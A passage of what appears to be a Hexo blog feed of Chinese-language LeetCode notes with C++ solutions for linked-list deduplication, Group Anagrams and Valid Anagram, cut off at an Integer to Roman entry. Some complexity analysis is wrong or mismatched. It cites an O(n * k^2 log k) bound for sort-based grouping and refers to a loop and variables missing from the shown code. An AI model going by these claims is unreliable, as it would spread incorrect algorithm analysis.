class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!head) <span class="keyword">return</span> <span class="literal">nullptr</span>; <span class="comment">// 如果鏈表為空，返回 nullptr</span></span><br><span class="line"></span><br><span class="line">        ListNode* current = head;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (current &amp;&amp; current-&gt;next) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;val == current-&gt;next-&gt;val) &#123;</span><br><span class="line">                ListNode* temp = current-&gt;next; <span class="comment">// 暫存重複節點</span></span><br><span class="line">                current-&gt;next = current-&gt;next-&gt;next; <span class="comment">// 跳過重複節點</span></span><br><span class="line">                <span class="keyword">delete</span> temp; <span class="comment">// 釋放重複節點的記憶體</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                current = current-&gt;next; <span class="comment">// 移動到下一節點</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>這裡的作法是如果有重複，直接將當前節點跳過重複節點，透過 <code>-&gt;next-&gt;next</code> 來存取下下個節點</p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/83/results2.jpeg"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li><p>外層 while 迴圈: 這個迴圈遍歷整個list，每個節點訪問一次，因此總共執行 <strong>n</strong> 次，其中 n 是list的節點數。</p></li><li><p>內層 while 迴圈: 這個迴圈在遇到重複的節點時會執行，並且最多也只會執行 <strong>n</strong> 次（因為每次內層迴圈執行都會將 <code>current</code> 推進至少一個節點，從而保證內層迴圈的總執行次數不會超過節點數 <strong>n</strong>）。</p></li><li><p>其他操作: 內部的條件判斷和指針操作都是常數時間的操作</p></li></ul><p>整個程式碼的時間複雜度為 $O(n)%，因為每個節點最多被訪問兩次（一次在外層迴圈，一次在內層迴圈）</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>額外變數: 只使用了少量的額外變數 (<code>ansHead</code>，<code>current</code>，<code>previous</code> 和 <code>temp</code>)，這些變數的數量與list的大小無關，是常數個數。</li><li>並沒有使用額外的動態記憶體，創建了臨時<code>temp</code> 並不影響整體的空間複雜度。</li></ul><p>因此，空間複雜度為 $O(1)$，即常數空間複雜度</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次算是第一次用 c++ 寫 linked list題目，但沒用到 <strong>std:list</strong> 有點可惜，因為原本只是想要練習STL用法的 XD<br>但想法主要還是跟C一樣，就當多一題 C 的練習吧</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Group Anagrams | Medium |LeetCode#49 Group Anagrams</title>
      <link href="/posts/e106a70e.html"/>
      <url>/posts/e106a70e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/49/Question.png"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 題目要求給定一個字串陣列 <code>strs</code>，需要將 Anagrams 分組，並且回傳經過分組過的陣列，回傳陣列中的Anagrams 可以是任何順序</li></ul><blockquote><p>Anagram 代表兩個單字裡面組成的字母和數量是完全一樣的，簡單來說 Anagram 就是由A單字重新排列組合成一個B單字。</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><ol><li>迭代 Input Vector</li><li>為每個Obj 建立Table</li><li>迭代 Vector 檢查是否有其他匹配的 Pair</li><li>如果有 insert item</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>我後來沒有在時間內解出來，因此還是參考了一下網路上的作法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;</span><br><span class="line"></span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">charCounts</span>(strs.<span class="built_in">size</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>,<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Step1 - Build the hash table </span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;strs.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="comment">//iterate the string</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> c: strs[i])&#123;</span><br><span class="line">                charCounts[i][c -<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Step2 - group the anagram</span></span><br><span class="line">        unordered_map&lt;string, vector&lt;string&gt;&gt; groups;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            string key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> count : charCounts[i]) &#123;</span><br><span class="line">                key += <span class="built_in">to_string</span>(count) + <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            key.<span class="built_in">pop_back</span>(); <span class="comment">// 移除最後一個多餘的&quot;#&quot;</span></span><br><span class="line">            groups[key].<span class="built_in">push_back</span>(strs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 3 - Store grouped anagrams in the result vector</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; group : groups) &#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(group.second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>初始化變數</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">charCounts</span>(strs.<span class="built_in">size</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>,<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li><code>ans</code> 是要return 的結果</li><li><code>charCounts</code> 是一個二維向量,用於存儲每個字串中各個字元的出現次數。它的大小與輸入字串的數量相同,每個內層向量的長度為 26,對應 26 個小寫英文字母的出現次數。</li></ul><p>建構 Hash Table</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;strs.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> c: strs[i])&#123;</span><br><span class="line">        charCounts[i][c -<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>迴圈循環遍歷每個字串,並計算每個字串中各個字元的出現次數,存儲在 <code>charCounts</code> 中</li></ul><p>將 anagrams 分組：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unordered_map&lt;string, vector&lt;string&gt;&gt; groups;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    string key = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> count : charCounts[i]) &#123;</span><br><span class="line">        key += <span class="built_in">to_string</span>(count) + <span class="string">&quot;#&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    key.<span class="built_in">pop_back</span>(); <span class="comment">// 移除最後一個多餘的&quot;#&quot;</span></span><br><span class="line">    groups[key].<span class="built_in">push_back</span>(strs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>定義了一個 <code>unordered_map</code> 類型的變數 groups,鍵是字串類型,值是一個向量,用於存儲具有相同字元計數的字串</li><li>對於每個字串,程式碼首先構建一個字串 key,該字串是通過將對應的字元計數向量中的每個元素連接而成的。例如,如果字符計數向量為 [1, 0, 1, 0, …],那麼對應的鍵字符串將是 “1#0#1#0#…”。</li><li>然後,程式碼使用這個 key 作為鍵,將當前字串插入到 groups 中對應的向量中</li></ul><p>儲存分組結果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; group : groups) &#123;</span><br><span class="line">    ans.<span class="built_in">push_back</span>(group.second);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最後,程式碼遍歷 groups 中的每個鍵值對,將每個值向量(即每組 Anagram)添加到 <code>ans</code>中。</p><p>返回結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return ans;</span><br></pre></td></tr></table></figure><h2 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h2><p><img src="/img/LeetCode/49/results.png"></p><blockquote><p>好像其實執行時間跟空間使用都不太優…</p></blockquote><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;</span><br><span class="line"></span><br><span class="line">        unordered_map &lt;string, vector&lt;string&gt;&gt; Dict;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Build hash table</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c: strs)&#123;</span><br><span class="line">            string word = c;</span><br><span class="line">            <span class="built_in">sort</span>(word.<span class="built_in">begin</span>(), word.<span class="built_in">end</span>());</span><br><span class="line">            Dict[word].<span class="built_in">push_back</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Build the results</span></span><br><span class="line">        vector&lt;vector&lt;string&gt;&gt; ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> x: Dict)&#123; </span><br><span class="line">            ans.<span class="built_in">push_back</span>(x.second);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>這個做法反而更簡潔，空間複雜度也更低</p></blockquote><ul><li>首先一樣透過 <code>unordered_map</code> 去初始化一個 Dict</li><li>接著就是要建立 Hash Table，首先透過在for迴圈內用 c 去迭代輸入字串陣列 <code>strs</code></li><li>對於每個字串，我們建立一個新的字串變數 <code>word</code> 來儲存，接著就是將 <code>word</code> 進行排序，如果有Anagram，他們做sorting 後的結果也會一樣</li><li>然後就是在我們的 HashTable的Key中放入排序過後的  <code>word</code>，而value 則是存放對應的輸入字串，我們使用 <code>push_back()</code> 將每個字串加入對應value的最尾端</li><li>最後就是要建立回傳的vector，並且我們將value的值，寫到用於回傳的 <code>ans</code> vector 中</li></ul><p>我們的 Hash Table 會長的像是這樣</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;aet&quot;: [&quot;eat&quot;, &quot;tea&quot;, &quot;ate&quot;],</span><br><span class="line">  &quot;ant&quot;: [&quot;tan&quot;, &quot;nat&quot;],</span><br><span class="line">  &quot;abt&quot;: [&quot;bat&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而回傳的 <code>ans</code> 會長的像是這樣：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [&quot;eat&quot;, &quot;tea&quot;, &quot;ate&quot;],</span><br><span class="line">  [&quot;tan&quot;, &quot;nat&quot;],</span><br><span class="line">  [&quot;bat&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/49/results2.png"></p><blockquote><p>在空間使用方面完勝之前的寫法</p></blockquote><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><p>以下分析原始寫法的時間以及空間複雜度</p><h2 id="時間複雜度-1"><a href="#時間複雜度-1" class="headerlink" title="時間複雜度-1"></a>時間複雜度-1</h2><p>時間複雜度為 $O(n * k)$, 其中 $n$ 是字串的數量, $k$ 是字串的平均長度</p><h2 id="空間複雜度-1"><a href="#空間複雜度-1" class="headerlink" title="空間複雜度-1"></a>空間複雜度-1</h2><p>空間複雜度為 $O(n * k)$, 因為需要創建 <code>charCounts</code> 和 <code>groups</code> 這兩個額外的數據結構。</p><p>接下來是第二種寫法的時間以及空間複雜度</p><h2 id="時間複雜度-2"><a href="#時間複雜度-2" class="headerlink" title="時間複雜度-2"></a>時間複雜度-2</h2><ul><li>在第一個 for 循環中,對於每個字串,需要執行以下操作:<ul><li>創建一個新的字串 <code>word</code>。這個操作的時間複雜度為 $O(k)$, 其中 $k$ 是字串的長度。</li><li>對 <code>word</code> 進行排序。排序操作的時間複雜度為 $O(k log k)$。</li><li>將原字串插入到Hash Table <code>Dict</code> 中對應的向量中。這個操作的時間複雜度為 $O(1)$。</li><li>因此,第一個循環的總時間複雜度為 $O(n * k * (k + k log k))$ &#x3D; $O(n * k^2 log k)$ ,其中 $n$ 是字串的數量。</li></ul></li><li>在第二個 for 循環中,需要遍歷Hash Table <code>Dict</code> 並將每個向量添加到 <code>ans</code> 中。這個操作的時間複雜度為 $O(n * k)$, 因為需要遍歷所有字串。</li><li>綜合起來,整個程式碼的時間複雜度為 $O(n * k^2 log k)$。</li></ul><h2 id="空間複雜度-2"><a href="#空間複雜度-2" class="headerlink" title="空間複雜度-2"></a>空間複雜度-2</h2><ul><li>需要創建一個Hash Table <code>Dict</code>,Hash Table中的Key是經過排序的字串,值是一個向量。在最壞情況下,所有字串都是不同的Anagram,因此Table的大小為 $O(n)$。</li><li>每個向量中存儲的是原始字串,因此所有向量的總空間為 $O(n * k)$</li><li>最終結果 <code>ans</code> 的空間複雜度也是 $O(n * k)$。</li></ul><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>透過這題，再次了解到自己對於C++ STL 的不熟悉，只能繼續努力了</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> hash table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有效的 Anagram | Easy |LeetCode#242 Valid Anagram</title>
      <link href="/posts/33d7b700.html"/>
      <url>/posts/33d7b700.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/242/question.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目要求給定兩個字串 <code>s</code> 與 <code>t</code>，若 <code>t</code> 為 <code>s</code> 的 Anagram，則回傳 true，若不是則回傳 false</li></ul><blockquote><p>Anagram 代表兩個單字裡面組成的字母和數量是完全一樣的，簡單來說 Anagram 就是由A單字重新排列組合成一個B單字。</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這次的想法一樣是建立 HashTable，所以一開始的想法如下:</p><ul><li>迭代 <code>s</code>，建立 HashTable</li><li>迭代 <code>t</code>，依序檢查字母是否有出現在 HashTable，進行比對</li><li>迭代完畢後，若全部匹配則回傳True</li><li>若無則否</li></ul><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//character, times</span></span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; Dict;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">length</span>() != t.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="comment">// If the lengths are different, they cannot be anagrams</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Build the dictionary</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            Dict[s[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;t.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            <span class="comment">// Match</span></span><br><span class="line">            <span class="keyword">if</span> (Dict.<span class="built_in">find</span>(t[i]) != Dict.<span class="built_in">end</span>())&#123;</span><br><span class="line">                Dict[t[i]]--;</span><br><span class="line">                <span class="keyword">if</span>(Dict[t[i]] == <span class="number">0</span>)&#123;</span><br><span class="line">                    Dict.<span class="built_in">erase</span>(t[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;  <span class="comment">//Not match</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(!Dict.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>首先透過 <code>unordered_map</code> 建立了一個 Hash table</li><li>若 <code>s</code> 與 <code>t</code> 長度不一致，可以提前回傳　<code>false</code></li><li>迭代 <code>ｓ</code>　建立 Hash table，並且 Key 會是 <code>s</code> 中出現的字母，value 會是出現次數</li><li>迭代 <code>t</code>，透過在 <code>Dict.find()</code> 中迭代 <code>t</code> 的字母，查看是否對應的 key 存在於 Hash Table 中</li><li>如果有，則該字母的對應將次數減少 (<code>Dict[t[i]]--;</code>)</li><li>如果已經減到0次，則將該key-value pair 從 Table 中移除</li><li>如果在 table 中沒找到 <code>t</code> 中的字母，則回傳　<code>false</code></li><li>最後若 table 不是空的，就代表t沒有完全匹配<code>s</code>，則一樣回傳 <code>false</code>，反之則回傳 <code>true</code></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/242/results1.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (s.<span class="built_in">length</span>() != t.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// A count vector with length 26 with init value 0</span></span><br><span class="line">        <span class="comment">// Count only lowercase letters </span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">count</span><span class="params">(<span class="number">26</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//build dictionary</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            count[s[i] - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; t.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            count[t[i]-<span class="string">&#x27;a&#x27;</span>]--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=count.<span class="built_in">begin</span>(); it!=count.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(*it != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>這裡與剛剛不同的是，這裡只宣告了一個 vector，大小為26，用來存放每個小寫字母的出現頻率，並且初始化為0</li><li>在迭代 s 的過程中，這裡會 <code>s[i] - &#39;a&#39;</code> 會先計算出字母索引，在vector中再++ (<code>count[s[i] - &#39;a&#39;]++;</code>)</li><li>在迭代 t 的過程中，會直接找對應的字母編號，並且將數量減1</li><li>最後，透過迭代器去迭代 vector，如果找到非0的數值，則代表 <code>t</code> 不是 <code>s</code> 的 Anagram，回傳 false</li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/242/results2.png"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>兩種做法都是 $O(n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>對於第一種我的做法，因為使用了 <code>unordered_map</code> 來存儲每個字元及其出現的次數。在最壞情況下，字串 s 中所有字元都是唯一的，因此字典的大小為 $O(k)$ 其中 $k$ 會是字元集大小，對於ASCII符號，k&#x3D;128，對於英文小寫字母，k&#x3D;26</p><blockquote><p>整體空間複雜度會是 $O(k)$，因為字典的大小與字符集的大小有關，並且在字串長度 $n$ 遠大於字符集大小 $k$ 時，可以認為空間複雜度是常數 $O(1)$</p></blockquote><p>第二種做法，<code>vector&lt;int&gt; count(26, 0);</code> vector 大小固定為 $O(1)$，因此為常數空間，複雜度為 $O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整數到羅馬數字 | Medium |LeetCode#12 Integer to Roman</title>
      <link href="/posts/Integer_to_Roman.html"/>
      <url>/posts/Integer_to_Roman.html</url>
      
